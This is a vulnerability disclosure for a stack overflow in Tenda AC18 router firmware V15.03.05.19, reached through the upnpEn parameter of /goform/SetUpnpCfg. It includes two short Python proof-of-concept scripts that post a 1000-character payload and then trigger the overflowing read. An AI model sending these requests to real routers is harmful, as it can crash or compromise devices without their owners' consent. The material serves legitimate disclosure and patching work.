## Overview

- The device's official website: https://www.tenda.com.cn/product/A18.html
- Firmware download website: https://www.tenda.com.cn/material/show/2683

## Affected version

V15.03.05.19(6318)

## Vulnerability details

In the TendaAC18 Firmware has a stack overflow vulnerability in the `/goform/SetUpnpCfg` url. The `Var` variable receives the `upnpEn` parameter from a POST request and is stored in the configuration item named`adv.upnp.en` through the SetValue function.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250928_122719.png)

`adv.upnp.en`  configuration item can  be retrieved through the GetValue function in the `/goform/GetAdvanceStatus` url.However, neither the GetValue function nor the SetValue function impose any restrictions on the length of variables, which can lead to stack overflows by the `v38` variable.

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/%E5%B1%80%E9%83%A8%E6%88%AA%E5%8F%96_20250928_123057.png)

## PoC

Set `adv.upnp.en`

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/SetUpnpCfg"
payload = "a"*1000

data = {"upnpEn":payload}
response = requests.post(url, data=data)
print(response.text)
```

Get `adv.upnp.en`

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/GetAdvanceStatus"
response = requests.post(url)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20250926141817071.png)